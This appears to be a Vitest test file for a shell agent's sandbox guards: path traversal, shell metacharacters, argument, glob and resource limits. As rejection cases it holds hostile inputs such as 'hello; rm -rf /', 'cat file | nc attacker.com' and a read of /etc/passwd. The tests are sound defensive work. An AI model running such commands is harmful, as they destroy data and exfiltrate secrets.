// src/services/shell-agent/__tests__/safety.spec.ts
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import {
  assertSafePath,
  assertNoShellMeta,
  assertArgsBudget,
  safeGlob,
  assertResourceBudget,
} from "../../sandbox";

let tmpDir: string;

beforeEach(async () => {
  tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "maria-shell-safety-"));
});

afterEach(async () => {
  await fs.rm(tmpDir, { recursive: true, force: true }).catch(() => void 0);
});

describe("sandbox.assertSafePath", () => {
  it("allows paths within workspace", async () => {
    await fs.writeFile(path.join(tmpDir, "test.txt"), "content");
    const _result = await assertSafePath(tmpDir, "test.txt");
    expect(_result.abs).toMatch(/test\.txt$/);
  });

  it("blocks path traversal with ../", async () => {
    await expect(assertSafePath(tmpDir, "../outside.txt")).rejects.toThrow(
      /path escapes workspace/,
    );
  });

  it("blocks absolute paths outside workspace", async () => {
    await expect(assertSafePath(tmpDir, "/etc/passwd")).rejects.toThrow(
      /path escapes workspace/,
    );
  });

  it("blocks home directory access", async () => {
    await expect(assertSafePath(tmpDir, "~/secret")).rejects.toThrow(
      /path denied/,
    );
  });

  it("blocks .git directory access", async () => {
    await fs.mkdir(path.join(tmpDir, ".git"));
    await expect(assertSafePath(tmpDir, ".git/config")).rejects.toThrow(
      /path denied/,
    );
  });

  it("blocks node_modules access", async () => {
    await fs.mkdir(path.join(tmpDir, "node_modules"));
    await expect(
      assertSafePath(tmpDir, "node_modules/package"),
    ).rejects.toThrow(/path denied/);
  });

  it("blocks symlinks", async () => {
    await fs.writeFile(path.join(tmpDir, "real.txt"), "content");
    await fs.symlink(
      path.join(tmpDir, "real.txt"),
      path.join(tmpDir, "link.txt"),
    );

    await expect(assertSafePath(tmpDir, "link.txt")).rejects.toThrow(
      /symlink denied/,
    );
  });
});

describe("sandbox.assertNoShellMeta", () => {
  it("allows clean arguments", () => {
    expect(() => assertNoShellMeta("hello")).not.toThrow();
    expect(() => assertNoShellMeta("src/index.ts")).not.toThrow();
  });

  it("blocks semicolon injection", () => {
    expect(() => assertNoShellMeta("hello; rm -rf /")).toThrow(
      /shell metacharacters/,
    );
  });

  it("blocks pipe operations", () => {
    expect(() => assertNoShellMeta("cat file | nc attacker.com")).toThrow(
      /shell metacharacters/,
    );
  });

  it("blocks redirection", () => {
    expect(() => assertNoShellMeta("echo secret > /tmp/leak")).toThrow(
      /shell metacharacters/,
    );
  });

  it("blocks command substitution", () => {
    expect(() => assertNoShellMeta("echo `whoami`")).toThrow(
      /shell metacharacters/,
    );
    expect(() => assertNoShellMeta("echo $(whoami)")).toThrow(
      /shell metacharacters/,
    );
  });

  it("blocks variable expansion", () => {
    expect(() => assertNoShellMeta("echo $HOME")).toThrow(
      /shell metacharacters/,
    );
  });
});

describe("sandbox.assertArgsBudget", () => {
  it("allows reasonable argument count and size", () => {
    expect(() => assertArgsBudget(["arg1", "arg2"])).not.toThrow();
  });

  it("blocks too many arguments", () => {
    const _manyArgs = Array(10).fill("arg");
    expect(() => assertArgsBudget(_manyArgs)).toThrow(/too many args/);
  });

  it("blocks oversized arguments", () => {
    const _longArg = "x".repeat(300);
    expect(() => assertArgsBudget([_longArg])).toThrow(/arg too long/);
  });

  it("respects custom limits", () => {
    expect(() => assertArgsBudget(["a", "b"], { maxArgs: 1 })).toThrow(
      /too many args/,
    );
    expect(() => assertArgsBudget(["x".repeat(50)], { maxLen: 10 })).toThrow(
      /arg too long/,
    );
  });
});

describe("sandbox.safeGlob", () => {
  beforeEach(async () => {
    // Create test _files
    await fs.mkdir(path.join(tmpDir, "src"));
    await fs.writeFile(path.join(tmpDir, "README.md"), "# Test");
    await fs.writeFile(path.join(tmpDir, "src", "index.ts"), "export {}");
    await fs.writeFile(path.join(tmpDir, "src", "utils.ts"), "export {}");
  });

  it("finds matching _files within limits", async () => {
    const _files = await safeGlob("*.md", tmpDir);
    expect(_files).toContain("README.md");
    expect(_files.length).toBe(1);
  });

  it("finds TypeScript _files", async () => {
    const _files = await safeGlob("src/*.ts", tmpDir);
    expect(_files).toHaveLength(2);
    expect(_files).toContain("src/index.ts");
    expect(_files).toContain("src/utils.ts");
  });

  it("blocks glob bombs (too many matches)", async () => {
    // This would be tested with a directory containing thousands of _files
    // For now, test the maxMatches parameter
    await expect(safeGlob("**/*", tmpDir, { maxMatches: 1 })).rejects.toThrow(
      /too many _files/,
    );
  });
});

describe("sandbox.assertResourceBudget", () => {
  it("allows resources within budget", () => {
    expect(() =>
      assertResourceBudget({
        fileCount: 10,
        totalSize: 1000,
      }),
    ).not.toThrow();
  });

  it("blocks excessive file count", () => {
    expect(() =>
      assertResourceBudget({
        fileCount: 2000,
        maxFiles: 1000,
      }),
    ).toThrow(/too many _files/);
  });

  it("blocks excessive total size", () => {
    expect(() =>
      assertResourceBudget({
        totalSize: 10_000_000,
        maxSize: 1_000_000,
      }),
    ).toThrow(/total size too large/);
  });
});
